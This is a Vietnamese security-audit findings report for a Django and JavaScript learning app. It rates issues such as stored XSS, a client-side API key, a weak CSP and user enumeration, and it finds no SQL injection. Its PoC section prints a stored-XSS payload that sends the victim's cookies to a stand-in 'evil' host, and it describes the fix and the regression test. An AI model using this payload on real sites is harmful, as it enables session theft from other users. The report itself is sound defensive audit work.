# 03 — Security findings (xếp hạng mức độ)

Thang: 🔴 Critical · 🟠 High · 🟡 Medium · 🔵 Low · ⚪ Info.
Trạng thái: ✅ đã sửa · 📝 khuyến nghị (chưa/không tự sửa).

| # | Mức | Loại | Vị trí | Mô tả | Trạng thái |
|---|-----|------|--------|-------|-----------|
| S1 | 🟠 High | Stored XSS | `frontend/static/js/dashboard.js:1100` | Tên tác giả bài viết (`p.author` ← `users.name`) nối thô vào innerHTML, **không escape**. Đặt tên = `<img src=x onerror=...>` → chạy JS trong feed của mọi người xem. Tên bình luận thì đã escape → chỉ bài viết sót. | ✅ Đã bọc `escHtml(p.author)` + test `forum-xss.test.mjs` |
| S2 | 🟡 Medium | XSS hardening | `dashboard.js:1188` | `escHtml` (bản dùng cho forum) thiếu null-guard (ném lỗi với null) và không escape `'`. | ✅ Nâng lên bản null-safe + escape `'` |
| S3 | 🟡 Medium | Lộ secret (kiến trúc) | `frontend/static/js/chatbot.js:7` | Gemini API key đặt **client-side** (`CHATBOT_CONFIG.apiKey`). Hiện để rỗng nên **chưa lộ**, nhưng chỉ cần điền key là bị public trong bundle + gọi thẳng `generativelanguage.googleapis.com`. | 📝 Proxy qua backend (xem khuyến nghị) |
| S4 | 🟡 Medium | Input validation | `accounts/views.py` `UserView.put` | Đổi email trùng người khác → **500** (IntegrityError chưa bắt) thay vì 400. | ✅ Pre-check unique + test |
| S5 | 🟡 Medium | CSP yếu | `config/settings.py:230` | `script-src 'unsafe-inline'` cho phép inline script → giảm hiệu lực chống XSS (làm S1 dễ khai thác hơn). Do template legacy cần inline. | 📝 Lộ trình bỏ inline (nonce/hash) |
| S6 | 🔵 Low | Config deploy | `config/settings.py:18,32` | Nếu `DJANGO_ENV≠production` trên Render: `SECRET_KEY` random mỗi lần restart (JWT mất hiệu lực), cookie không `Secure`, throttle nới lỏng. `ALLOWED_HOSTS` mặc định `localhost` → 400 DisallowedHost nếu quên set. | 📝 Checklist env production |
| S7 | 🔵 Low | User enumeration | `accounts/views.py` login/register | Login trả 401 ngay khi email không tồn tại (timing khác khi tồn tại); register lộ "Email đã được sử dụng". | 📝 Chấp nhận được cho app học tập; ghi nhận |
| S8 | ⚪ Info | Token trong URL | `notifications/views.py:71` | SSE nhận access token qua query param (EventSource không set header được). Đã dùng short-lived access + không log referer. | ⚪ Chấp nhận (đã cân nhắc) |

## SQL Injection — kết luận: ✅ KHÔNG có lỗ hổng
Toàn bộ raw SQL đi qua helper tham số hóa `common/db.py` (`q/q1/x` dùng `%s` + params).
Các f-string SQL đều **chỉ nội suy định danh từ whitelist nội bộ**, không từ input user:
- `courseadmin/views.py`: cột từ hằng `_COURSE_FIELDS`; `set_clause` từ key đã lọc theo whitelist.
- `forum/views.py`: `table/id_col/parent_table` là hằng truyền cứng (`'posts'`, `'post_likes'`…).
- `leaderboard/views.py:104`: `order_col` chặn bằng `if order_col not in ('xp','streak')`.
- `courses/views.py`: mọi giá trị tìm kiếm/lọc đều bind qua `%s`.

> Đã kiểm thủ công + regex quét `q(f`, `execute(f`, `.format(`, nối chuỗi. Không có điểm nào ghép giá trị người dùng trực tiếp vào câu SQL.

## Chi tiết & PoC S1 (đã vá)
1. User A đổi tên hồ sơ thành `<img src=x onerror="fetch('//evil/?c='+document.cookie)">`.
2. A đăng 1 bài trong forum.
3. User B mở forum → `_renderPosts` chèn tên A vào innerHTML → payload chạy trong phiên của B (đánh cắp token trong `localStorage`).
- **Vá**: `escHtml(p.author)` → payload thành text `&lt;img...&gt;`.
- **Test hồi quy**: `frontend/e2e/unit/forum-xss.test.mjs` (đỏ trước, xanh sau).
